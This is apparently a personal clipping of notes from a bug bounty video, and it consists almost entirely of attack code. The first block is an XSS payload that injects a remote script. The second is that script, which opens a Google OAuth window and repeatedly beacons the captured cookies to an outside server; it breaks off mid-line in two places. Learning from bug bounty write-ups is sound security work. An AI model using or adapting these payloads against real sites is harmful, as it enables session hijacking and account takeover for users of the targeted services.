---
title: How a Mistake Earned a $5,000 Bug Bounty || Real Target Demonstration
Type: Video
published: 2026-07-25
Source: https://www.youtube.com/watch?v=ui7X0SmDDyw
Creator: "[[Tehlan]]"
date: 2026-07-29
tags:
  - Clippings
  - Video
  - Bugs/xss
Finished: false
Cover: https://www.youtube.com/img/desktop/yt_1200.png
Site: YouTube
---
## Highlights
XSS Payload:
```
<img/src/onerror='s=document.createElement("script");s.src="https://myserver/script.js";document.body.append(s);'>
```

script.js:
```
let exploitWindow = window.open('https://accounts.google.com/o/oauth2/auth?redirect_uri=https://example.com/auth/google/callback&response_ty
"example",
"width=600,height=400, status=yes,scrollbars=yes, resizable=yes",
);
// checking the cookies and sending them to server
var checkClosed = setInterval(function () {
navigator.sendBeacon (
"https://myserver.com/save.php",
JSON.stringify({ cookiex: exploitWindow.document.cookie }),
);
if (exploitWindow.closed) {
clearInterval(checkClosed);
var cookies = document.cookie;
alert(cookies);
console.log(cookies);
navigator.sendBeacon (
"https://myserver.com/save.php",
```